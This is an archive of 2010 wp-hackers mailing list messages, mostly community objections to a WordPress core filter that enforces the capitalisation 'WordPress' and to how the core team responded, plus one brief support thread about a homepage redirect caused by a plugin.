http://urbangiraffe.com/support/topic/home-page-is-redirecting-to-another-wp-page-without-my-instruction-to-do-so

If it is this plugin that's causing the problem, I suggest you move
your discussion to those support forums as the people there will be
able to help you better.  If they can fix your problem, please also
post a note on your WordPress.org forums thread so that people
searching that site can get the answer they need.

Please also direct future support inquiries to the proper channels.

From jwriteclub at gmail.com  Tue Jul  6 18:14:21 2010
From: jwriteclub at gmail.com (Christopher O'Connell)
Date: Tue, 6 Jul 2010 11:14:21 -0700
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C336A55.6080803@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com> 
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com> 
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com> 
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com> 
	<4C3250B0.5070900@laptoptips.ca>
	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com> 
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com> 
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>
	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com> 
	<4C32AEE0.5070803@mullenweg.com> <4C333B03.8010603@rotorised.com> 
	<4C333EAD.8080508@thedextrousweb.com> <4C3365D1.3030104@mullenweg.com> 
	<440644123.111007.1278437429658.JavaMail.open-xchange@oxusltgw10.schlund.de>
	<4C336A55.6080803@mullenweg.com>
Message-ID: <AANLkTinWrjyV3wg7EVfv3b9v4pwRrkrb7PspaxF2KSdP@mail.gmail.com>

The P function is horrendously offensive and improper, but that is nothing
compared to the way in which this is being treated by the core team. I
shan't rehash all of the arguments, others have said it far more elegantly
than I.

But, Matt, the difference between disagreement and disregard is that when
one disagrees one still takes a moment to consider the pros- and cons- of
ones argument.

The P function is a purely self-aggrandizing decree -- the sort of hubris
and abuse that I had resonably hoped the WP community had moved beyond. As
the Wall Stree Journal states in their editorial philosophy

[We stand] against ... the ukases of kings and other collectivists; and for
individual autonomy against dictators, bullies and even the tempers of
momentary majorities.

WordPress is meant to be a community, and the reason this has people red
with rage, writing, instead of hacking, is because they are rightly filled
with disgust and horror at such low action.

~ Christopher

On Tue, Jul 6, 2010 at 10:39 AM, Matt Mullenweg <m at mullenweg.com> wrote:

> On 7/6/2010 1:30 PM, eric at eamann.com wrote:
>
>> Some time ago I wrote a patch in response to a user's request that we add
>> Skype
>> and Facebook and LinkedIn and other fields to the profile page ... it was
>> rejected because "There's a filter there, which means a plugin can easily
>> control all of this." (ticket #11367)  It makes sense that we not include
>> additional (trivial) functionality like this into core ... it made sense
>> there
>> and it still makes sense now.
>>
>
> For what it's worth, I think it would be nice to modernize those fields,
> and even go a step further to authenticate them where possible. I would have
> said so if I had seen that ticket.
>
>
>  It doesn't paint a pretty picture of the core teams' opinion of the rest
>> of the
>> community ...
>>
>
> One of the core tenets of Open Source development is that people can
> disagree, strongly, but still respect each other.
>
> --
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mailapera at gmail.com  Tue Jul  6 18:19:38 2010
From: mailapera at gmail.com (mailapera)
Date: Tue, 6 Jul 2010 20:19:38 +0200
Subject: [wp-hackers] Home redirects to new page on WP 3.0
In-Reply-To: <AANLkTilWOeF6vXIre90JId1yLk71gduhXyEg0fsaCKxT@mail.gmail.com>
References: <AANLkTinqv1mW4Ws8XzJ9DIG0UN-TX_lwdkc2prHDg1a6@mail.gmail.com> 
	<AANLkTilWOeF6vXIre90JId1yLk71gduhXyEg0fsaCKxT@mail.gmail.com>
Message-ID: <AANLkTimb3dL4GNgeVeDPnMYt-x0qa3tcYxSViC1nZONl@mail.gmail.com>

Hi, Thanks for your reply.

Since nothing else but the WP core files changed prior to the problem
appearing, I arrived to the logical conclusion as it must be those
files that create the problem. I thought those tables were wp core
tables. I disabled all plugins and the problem stays. I do not have
urban giraffe's plugin.

I know this is not a support forum. I posted here as I deemed it a bug
of the core files.



On Tue, Jul 6, 2010 at 8:13 PM, Michael D Adams <mda at blogwaffe.com> wrote:
> On Tue, Jul 6, 2010 at 9:27 AM, mailapera <mailapera at gmail.com> wrote:
>> I installed 3.0 and after creating a new page, additional to those I
>> already had prior to the upgrade to 3.0, my homepage redirects to that
>> newly created page with a 301 permanent redirect. If I delete the page
>> the redirect stays and produces a 404 error each time I try to visit
>> the homepage. To eliminate the error I have to go in the DB and delete
>> the 301 entry.
>
> This list is not a support list.
>
> You have a problem with Redirects. ?Do you have any redirection
> plugins installed? ?Have you tried looking through the source of your
> plugins to find mentions of the wp_redirection_items and
> wp_redirection_modules tables (these are not core tables)?
>
> My guess is that this is a problem with Urban Giraffe's Redirection
> plugin http://urbangiraffe.com/plugins/redirection/ ?Do you have that
> plugin installed? If you disable the plugin, does the problem go away
> (always a good debugging step).
>
> Here's a link which addresses what sounds like your problem.
>
> http://urbangiraffe.com/support/topic/home-page-is-redirecting-to-another-wp-page-without-my-instruction-to-do-so
>
> If it is this plugin that's causing the problem, I suggest you move
> your discussion to those support forums as the people there will be
> able to help you better. ?If they can fix your problem, please also
> post a note on your WordPress.org forums thread so that people
> searching that site can get the answer they need.
>
> Please also direct future support inquiries to the proper channels.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From chip at chipbennett.net  Tue Jul  6 18:29:26 2010
From: chip at chipbennett.net (Chip Bennett)
Date: Tue, 6 Jul 2010 13:29:26 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C3365D1.3030104@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<4C333EAD.8080508@thedextrousweb.com>
	<4C3365D1.3030104@mullenweg.com>
Message-ID: <201007061329.26694.chip@chipbennett.net>

How about moving the entire function itself into a plugin, and see how many 
downloads *it* gets?

-- 
Chip Bennett
chip at chipbennett.net
www.chipbennett.net

On Tuesday 06 July 2010 12:20:17 pm Matt Mullenweg wrote:
> On 7/6/2010 10:33 AM, Harry Metcalfe wrote:
> > I wrote a patch weeks ago to take it out. I'm really not trying to be
> > difficult! I just think this filter is a terrible idea. And it's a
> > little sad to witness the total lack of interest from the core team.
> > This isn't how it's supposed to work, IMO.
> 
> Maybe write and promote a plugin, and we can see how many downloads it
> gets?

From elizabeth at slatetechpdx.com  Tue Jul  6 18:32:29 2010
From: elizabeth at slatetechpdx.com (Elizabeth Buckwalter)
Date: Tue, 6 Jul 2010 11:32:29 -0700
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 18
In-Reply-To: <mailman.9505.1278411261.1338.wp-hackers@lists.automattic.com>
References: <mailman.9505.1278411261.1338.wp-hackers@lists.automattic.com>
Message-ID: <AANLkTinvAwrxgxqrz3bbzLo569vvCcDVzNpEQSA8eIQb@mail.gmail.com>

On Tue, Jul 6, 2010 at 3:14 AM,
<wp-hackers-request at lists.automattic.com> wrote:
> Send wp-hackers mailing list submissions to
> ? ? ? ?wp-hackers at lists.automattic.com
>
> To subscribe or unsubscribe via the World Wide Web, visit
> ? ? ? ?http://lists.automattic.com/mailman/listinfo/wp-hackers
> or, via email, send a message with subject or body 'help' to
> ? ? ? ?wp-hackers-request at lists.automattic.com
>
> You can reach the person managing the list at
> ? ? ? ?wp-hackers-owner at lists.automattic.com
>
> When replying, please edit your Subject line so it is more specific
> than "Re: Contents of wp-hackers digest..."
>
>
> Today's Topics:
>
> ? 1. Re: Putting the P in WordPress (Matt Mullenweg)
> ? 2. Re: Putting the P in WordPress (Joaquin Rodriguez Montero)
> ? 3. Re: Putting the P in WordPress (mrmist)
> ? 4. Re: Putting the P in WordPress (Harry Metcalfe)
> ? 5. Re: Putting the P in WordPress (Gavin Pearce)
> ? 6. Re: wp_mail_from and wp_mail_from_name (Simon Blackbourn)
> ? 7. Re: Putting the P in WordPress (Mike Little)
> ? 8. Re: Putting the P in WordPress (Ben Huson)
>
>
> ----------------------------------------------------------------------
>
> Message: 1
> Date: Tue, 06 Jul 2010 00:19:44 -0400
> From: Matt Mullenweg <m at mullenweg.com>
>
> On 7/5/2010 11:46 PM, Jeff Jason wrote:
>> Why don't people care a little more about implementation and design
>> decisions that actually matter.
>
> You're completely right. The more trivial the topic, the more people
> likely to have an opinion, because it's easier to do so.

Just emphasizing.

> --
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com

[snip]

> Message: 7
> Date: Tue, 6 Jul 2010 10:53:24 +0100
> From: Mike Little <wordpress at zed1.com>
>
> On 6 July 2010 10:32, Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:
>
>>
>> 1) The vast majority of people seem to be in favor for it being removed
>> (REF# TRAC, this thread, forums).
>>
> A problem here, is that anyone thinks 20 people in an email conversation is
> a 'vast majority'. It quite simply is not. So the vast majority *of
> WordPress users* have no opinion on this.

It would be correct to say vast majority.  As you can rarely get every
one's opinion, you must settle for a subset.  Because WordPress's
support/conversation is well established in the forums, here, and in
Trac, if most of the people in the subset *don't* like something , you
can be sure that most WordPress users *don't* like it either.

[snip]

>> At the end of the day who CARES if WordPress is Wordpress, Wordress,
>> wordPress or anything else -
>
>
> As has been pointed out on this thread, WordPress is a trademark, and as
> such *must* be actively protected, otherwise the trademark status will be
> lost.

On my iPhone, when I type 'iphone' the little box comes up and my text
is replaced with 'iPhone'.  However, I can *choose* to hit the little
x, the little box will go away, and I am left with 'iphone'.  I like
the *choice*, because maybe I don't like CamelCase, and I'll type
Camelcase, because I don't want to hit the shift key in the middle of
the word.  If a little box pops up with the CamelCase version, then
I'd go with it, but no disrespect intended Camelcase is just easier.

>
> Mike
> --
> Mike Little
> http://zed1.com/
>

[snip]

-- 
Thanks,
Elizabeth Buckwalter

From Gavin.Pearce at 3seven9.com  Tue Jul  6 18:32:55 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Tue, 6 Jul 2010 19:32:55 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTinWrjyV3wg7EVfv3b9v4pwRrkrb7PspaxF2KSdP@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
	<4C3250B0.5070900@laptoptips.ca><AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com><AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>
	<4C32AEE0.5070803@mullenweg.com> <4C333B03.8010603@rotorised.com>
	<4C333EAD.8080508@thedextrousweb.com>
	<4C3365D1.3030104@mullenweg.com>
	<440644123.111007.1278437429658.JavaMail.open-xchange@oxusltgw10.schlund.de><4C336A55.6080803@mullenweg.com>
	<AANLkTinWrjyV3wg7EVfv3b9v4pwRrkrb7PspaxF2KSdP@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FC6@tbs-sbs01.TBS.local>

Agreed.

I'd like to see the logic behind the decision to include this function
detailed by the core team - and the pros weighed up against the cons.

If someone from the core team can explain the process behind putting
this in - or was it just chucked in on the fly...

As I see it:

*Pros*
Everyone spells WordPress in the way Matt likes (v. minor issue).

*Cons*
Core code starts to affect the textual output of blogs.
Core code breaks URI paths for some sites (major issue).

This question keeps getting ignored, so to make it a bit clearer....


What do we *gain* with this function to make all Wordpress = WordPress,
except for the added overhead and complications?

What's in it for the WordPress community?

Gav


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of
Christopher O'Connell
Sent: 06 July 2010 19:14
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

The P function is horrendously offensive and improper, but that is
nothing
compared to the way in which this is being treated by the core team. I
shan't rehash all of the arguments, others have said it far more
elegantly
than I.

But, Matt, the difference between disagreement and disregard is that
when
one disagrees one still takes a moment to consider the pros- and cons-
of
ones argument.

The P function is a purely self-aggrandizing decree -- the sort of
hubris
and abuse that I had resonably hoped the WP community had moved beyond.
As
the Wall Stree Journal states in their editorial philosophy

[We stand] against ... the ukases of kings and other collectivists; and
for
individual autonomy against dictators, bullies and even the tempers of
momentary majorities.

WordPress is meant to be a community, and the reason this has people red
with rage, writing, instead of hacking, is because they are rightly
filled
with disgust and horror at such low action.

~ Christopher

On Tue, Jul 6, 2010 at 10:39 AM, Matt Mullenweg <m at mullenweg.com> wrote:

> On 7/6/2010 1:30 PM, eric at eamann.com wrote:
>
>> Some time ago I wrote a patch in response to a user's request that we
add
>> Skype
>> and Facebook and LinkedIn and other fields to the profile page ... it
was
>> rejected because "There's a filter there, which means a plugin can
easily
>> control all of this." (ticket #11367)  It makes sense that we not
include
>> additional (trivial) functionality like this into core ... it made
sense
>> there
>> and it still makes sense now.
>>
>
> For what it's worth, I think it would be nice to modernize those
fields,
> and even go a step further to authenticate them where possible. I
would have
> said so if I had seen that ticket.
>
>
>  It doesn't paint a pretty picture of the core teams' opinion of the
rest
>> of the
>> community ...
>>
>
> One of the core tenets of Open Source development is that people can
> disagree, strongly, but still respect each other.
>
> --
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From cross at thisismyurl.com  Tue Jul  6 18:33:28 2010
From: cross at thisismyurl.com (Christopher Ross)
Date: Tue, 6 Jul 2010 15:33:28 -0300
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C336A55.6080803@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>	<4C2ED16D.9050907@szub.net>	<001201cb1aa2$e1c9bd30$a55d3790$@com>	<4C3250B0.5070900@laptoptips.ca>	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com>	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com>	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com>	<4C32AEE0.5070803@mullenweg.com>	<4C333B03.8010603@rotorised.com>	<4C333EAD.8080508@thedextrousweb.com>	<4C3365D1.3030104@mullenweg.com>
	<440644123.111007.1278437429658.JavaMail.open-xchange@oxusltgw10.schlund.de>
	<4C336A55.6080803@mullenweg.com>
Message-ID: <6C02E437-EC3B-47A3-A222-1136BD8FCCA5@thisismyurl.com>


On 2010-07-06, at 2:39 PM, Matt Mullenweg wrote:

> One of the core tenets of Open Source development is that people can disagree, strongly, but still respect each other.

Matt, I wish I could say I felt there was any respect for the community here but there hasn't been a discussion, it's a dictation from you to the rest of the world which states you have the right to edit websites without regard for editorial respect.


__

Christopher Ross

Toronto      1 (416) 840-5828
Fredericton 1 (506) 474-2708

http://christopherross.ca
http://www.thisismyurl.com


From Gavin.Pearce at 3seven9.com  Tue Jul  6 18:34:09 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Tue, 6 Jul 2010 19:34:09 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <201007061329.26694.chip@chipbennett.net>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com><4C333EAD.8080508@thedextrousweb.com><4C3365D1.3030104@mullenweg.com>
	<201007061329.26694.chip@chipbennett.net>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>

+1 :)

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Chip
Bennett
Sent: 06 July 2010 19:29
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

How about moving the entire function itself into a plugin, and see how
many 
downloads *it* gets?

-- 
Chip Bennett
chip at chipbennett.net
www.chipbennett.net

On Tuesday 06 July 2010 12:20:17 pm Matt Mullenweg wrote:
> On 7/6/2010 10:33 AM, Harry Metcalfe wrote:
> > I wrote a patch weeks ago to take it out. I'm really not trying to
be
> > difficult! I just think this filter is a terrible idea. And it's a
> > little sad to witness the total lack of interest from the core team.
> > This isn't how it's supposed to work, IMO.
> 
> Maybe write and promote a plugin, and we can see how many downloads it
> gets?
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From mitch at studionashvegas.com  Tue Jul  6 18:36:21 2010
From: mitch at studionashvegas.com (Mitch Canter)
Date: Tue, 6 Jul 2010 13:36:21 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<4C333EAD.8080508@thedextrousweb.com>
	<4C3365D1.3030104@mullenweg.com>
	<201007061329.26694.chip@chipbennett.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>
Message-ID: <AANLkTinUF70i9erH7Q7cxPeRa_Y3jhe4OG-dngu7B9zi@mail.gmail.com>

+1 - I'm more than a little surprised at how this thread is going down.

On Tue, Jul 6, 2010 at 1:34 PM, Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:
> +1 :)
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Chip
> Bennett
> Sent: 06 July 2010 19:29
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Putting the P in WordPress
>
> How about moving the entire function itself into a plugin, and see how
> many
> downloads *it* gets?
>
> --
> Chip Bennett
> chip at chipbennett.net
> www.chipbennett.net
>
> On Tuesday 06 July 2010 12:20:17 pm Matt Mullenweg wrote:
>> On 7/6/2010 10:33 AM, Harry Metcalfe wrote:
>> > I wrote a patch weeks ago to take it out. I'm really not trying to
> be
>> > difficult! I just think this filter is a terrible idea. And it's a
>> > little sad to witness the total lack of interest from the core team.
>> > This isn't how it's supposed to work, IMO.
>>
>> Maybe write and promote a plugin, and we can see how many downloads it
>> gets?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Mitch Canter
studionashvegas
http://www.studionashvegas.com
615-512-2838

Find me on Twitter! http://www.studionashvegas.com

I only check email 2-3 times a day, but if you don't hear back in
24hr, let me know.  Thanks!

From chip at chipbennett.net  Tue Jul  6 18:42:40 2010
From: chip at chipbennett.net (Chip Bennett)
Date: Tue, 6 Jul 2010 13:42:40 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C336A55.6080803@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<440644123.111007.1278437429658.JavaMail.open-xchange@oxusltgw10.schlund.de>
	<4C336A55.6080803@mullenweg.com>
Message-ID: <201007061342.40892.chip@chipbennett.net>

I don't see a great deal of *respect* being shown for the quite valid and 
myriad concerns expressed by the community regarding this function being added 
to core.

Cutting-and-pasting an earlier email response I wrote but didn't go through 
(on that note: does the wp-hackers mail list not accept GPG-signed emails?):

I believe that the issue here involves equally the underlying impropriety of 
the filter and your perceived attitude toward those who are asking for the 
filter's removal.

As for your justification for this function's inclusion in core: I find it 
somewhat hypocritical with respect to the stated philosophy of WordPress to be 
Free Software. May I remind you of this statement, which is part of GNU's 
definition of free software:

"The freedom to run the program means the freedom for any kind of person or 
organization to use it on any kind of computer system, for any kind of overall 
job and purpose, without being required to communicate about it with the 
developer or any other specific entity. In this freedom, it is the user's 
purpose that matters, not the developer's purpose; you as a user are free to 
run the program for your purposes, and if you distribute it to someone else, 
she is then free to run it for her purposes, but you are not entitled to 
impose your purposes on her."

Reiterating:

"it is the user's purpose that matters, not the developer's purpose"

By imposing on end users your purpose - regardless of how noble - of 
correctly spelling "WordPress" you are violating the very freedoms you 
espouse.

(And no: this issue has nothing whatsoever to do with protection or violation 
of trademark.)

Saying that the imposition can be easily changed with a two-line plugin is 
entirely irrelevant for the vast majority of users who do not have the 
technical competence to write such a plugin. Adding a plugin to Extend is a 
poor man's alternative to what is the only (technically and philosophically) 
right course of action: if the function must be in core, expose a 
configuration and set it to disabled by default.

As for the function itself: I find it difficult to reconcile adding such a 
frivolous function to core, given the general philosophy of keeping so much 
out of core. As such, its inclusion appears to be incredibly pedantic.

This function should have been written as a plugin from the very beginning. 
Bundle it with core if you must (surely it is - at a minimum - more useful 
than Hello Dolly, after all).

But it is less the function itself, and more the attitude in response to those 
calling for its change/removal, that concerns me - and that prompts me to 
respond.

Matt, it is your attitude - in turns arrogant, condescending, dismissive, and 
snide - that is exacerbating the situation. You are the one who is 
needlessly increasing the emotional appeal in this matter.

Can I suggest that perhaps this issue is best discussed devoid of snide, 
arrogant, and dismissive remarks (from all parties)?

As for me: what concerns me most is the "slippery slope" consideration of the 
core development team's response to community outcry regarding this function 
being added to core. How does the decision to add this function to core (and 
the response to the community) in any way indicative of concern or respect for 
the needs, desires, and *freedoms* of the WordPress community?

-- 
Chip Bennett
chip at chipbennett.net
www.chipbennett.net

On Tuesday 06 July 2010 12:39:33 pm Matt Mullenweg wrote:
> On 7/6/2010 1:30 PM, eric at eamann.com wrote:
> > Some time ago I wrote a patch in response to a user's request that we add
> > Skype and Facebook and LinkedIn and other fields to the profile page ...
> > it was rejected because "There's a filter there, which means a plugin
> > can easily control all of this." (ticket #11367)  It makes sense that we
> > not include additional (trivial) functionality like this into core ...
> > it made sense there and it still makes sense now.
> 
> For what it's worth, I think it would be nice to modernize those fields,
> and even go a step further to authenticate them where possible. I would
> have said so if I had seen that ticket.
> 
> > It doesn't paint a pretty picture of the core teams' opinion of the rest
> > of the community ...
> 
> One of the core tenets of Open Source development is that people can
> disagree, strongly, but still respect each other.

From viniciusandre at gmail.com  Tue Jul  6 18:44:02 2010
From: viniciusandre at gmail.com (Vinicius Massuchetto)
Date: Tue, 6 Jul 2010 15:44:02 -0300
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <201007061329.26694.chip@chipbennett.net>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<4C333EAD.8080508@thedextrousweb.com>
	<4C3365D1.3030104@mullenweg.com>
	<201007061329.26694.chip@chipbennett.net>
Message-ID: <AANLkTileYyT_FWnzaBkLBOAmeXL5HEcWiUwn_RWY6Y6R@mail.gmail.com>

On Tue, Jul 6, 2010 at 3:29 PM, Chip Bennett <chip at chipbennett.net> wrote:
> How about moving the entire function itself into a plugin, and see how many
> downloads *it* gets?

Nice one! =D
--
Vin?cius Massuchetto

From 24-7 at gmx.net  Tue Jul  6 18:50:21 2010
From: 24-7 at gmx.net (24/7)
Date: Tue, 6 Jul 2010 11:50:21 -0700 (PDT)
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C3365D1.3030104@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com> 
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com> 
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com> 
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com> 
	<4C3250B0.5070900@laptoptips.ca>
	<AANLkTikIXNX1knRL5MDAC-sJ1nr9c9x-QdBkdyUtVVda@mail.gmail.com> 
	<AANLkTimR2sEeL-MOX4qlm9X8fTdJMDRHiM8WAbMTgKcH@mail.gmail.com> 
	<C4230271-1B2B-4737-BE67-5259720E7CC8@striderweb.com>
	<AANLkTikURjGZbtFNE7wCKVf0Nn-6V_XyzJmeOTjnxXbH@mail.gmail.com> 
	<4C32AEE0.5070803@mullenweg.com> <4C333B03.8010603@rotorised.com> 
	<4C333EAD.8080508@thedextrousweb.com> <4C3365D1.3030104@mullenweg.com>
Message-ID: <94c000de-bd0b-4b9b-850b-bc205c08fb90@u26g2000yqu.googlegroups.com>

On 6 Jul., 19:20, Matt Mullenweg <m... at mullenweg.com> wrote:
> On 7/6/2010 10:33 AM, Harry Metcalfe wrote:
>
> > I wrote a patch weeks ago to take it out. I'm really not trying to be
> > difficult! I just think this filter is a terrible idea. And it's a
> > little sad to witness the total lack of interest from the core team.
> > This isn't how it's supposed to work, IMO.
>
> Maybe write and promote a plugin, and we can see how many downloads it gets?

Reading things like this comments or the whole discussion, i think
it's more about a general theme. You could compare it to politicans
and people or with a house and it's inhabitants. They all need one
thing: rules they can rely on. Currently there's just a large gap
filled with emotions on both sides...

Possible Q#1: How many downloads would such a plugin need?
Possible Q#2: When does an idea get's accepted as a possible
alternative?

-K.

From 24-7 at gmx.net  Tue Jul  6 18:51:02 2010
From: 24-7 at gmx.net (24/7)
Date: Tue, 6 Jul 2010 11:51:02 -0700 (PDT)
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTileYyT_FWnzaBkLBOAmeXL5HEcWiUwn_RWY6Y6R@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com> 
	<4C333EAD.8080508@thedextrousweb.com> <4C3365D1.3030104@mullenweg.com> 
	<201007061329.26694.chip@chipbennett.net>
	<AANLkTileYyT_FWnzaBkLBOAmeXL5HEcWiUwn_RWY6Y6R@mail.gmail.com>
Message-ID: <3e131826-79ac-478c-a235-0dfa254af480@d37g2000yqm.googlegroups.com>

On 6 Jul., 19:20, Matt Mullenweg <m... at mullenweg.com> wrote:
> On 7/6/2010 10:33 AM, Harry Metcalfe wrote:
>
> > I wrote a patch weeks ago to take it out. I'm really not trying to be
> > difficult! I just think this filter is a terrible idea. And it's a
> > little sad to witness the total lack of interest from the core team.
> > This isn't how it's supposed to work, IMO.
>
> Maybe write and promote a plugin, and we can see how many downloads it gets?

Reading things like this comments or the whole discussion, i think
it's more about a general theme. You could compare it to politicans
and people or with a house and it's inhabitants. They all need one
thing: rules they can rely on. Currently there's just a large gap
filled with emotions on both sides...

Possible Q#1: How many downloads would such a plugin need?
Possible Q#2: When does an idea get's accepted as a possible
alternative?

-K.

From dan at phiffer.org  Tue Jul  6 19:17:12 2010
From: dan at phiffer.org (Dan Phiffer)
Date: Tue, 6 Jul 2010 15:17:12 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <201007061342.40892.chip@chipbennett.net>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<440644123.111007.1278437429658.JavaMail.open-xchange@oxusltgw10.schlund.de>
	<4C336A55.6080803@mullenweg.com>
	<201007061342.40892.chip@chipbennett.net>
Message-ID: <047B62EC-D3DC-4161-A76D-443B4B72D6EB@phiffer.org>

Hi Hackers,

I'm only piling on because I've had a ticket closed on grounds I disagreed with. Process is the issue here -- this is part of a pattern that makes me feel less inclined to participate. The filter was a bad decision that hadn't been fully thought through, but it's the response to objections that has been worrying. Some of these justifications are just silly.

I'll just add this quotation from a book called Being Wrong...

"In our collective imagination, error is associated not just with shame and stupidity but also with ignorance, indolence, psychopathology, and moral degeneracy. This set of associations was nicely summed up by the Italian cognitive scientist Massimo Piattelli-Palmarini, who noted that we err because of (among other things) ?inattention, distraction, lack of interest, poor preparation, genuine stupidity, timidity, braggadocio, emotional imbalance, . . . ideological, racial, social or chauvinistic prejudices, as well as aggressive or prevaricatory instincts.? In this rather despairing view ? and it is the common one ? our errors are evidence of our gravest social, intellectual, and moral failings.

Of all the things we are wrong about, this idea of error might well top the list. It is our meta-mistake: we are wrong about what it means to be wrong. Far from being a sign of intellectual inferiority, the capacity to err is crucial to human cognition. Far from being a moral flaw, it is inextricable from some of our most humane and honorable qualities: empathy, optimism, imagination, conviction, and courage. And far from being a mark of indifference or intolerance, wrongness is a vital part of how we learn and change. Thanks to error, we can revise our understanding of ourselves and amend our ideas about the world."

http://www.nytimes.com/2010/06/11/books/excerpt-being-wrong.html

Thanks,
-Dan

On Jul 6, 2010, at 2:42 PM, Chip Bennett wrote:

> I don't see a great deal of *respect* being shown for the quite valid and 
> myriad concerns expressed by the community regarding this function being added 
> to core.
> 
> Cutting-and-pasting an earlier email response I wrote but didn't go through 
> (on that note: does the wp-hackers mail list not accept GPG-signed emails?):
> 
> I believe that the issue here involves equally the underlying impropriety of 
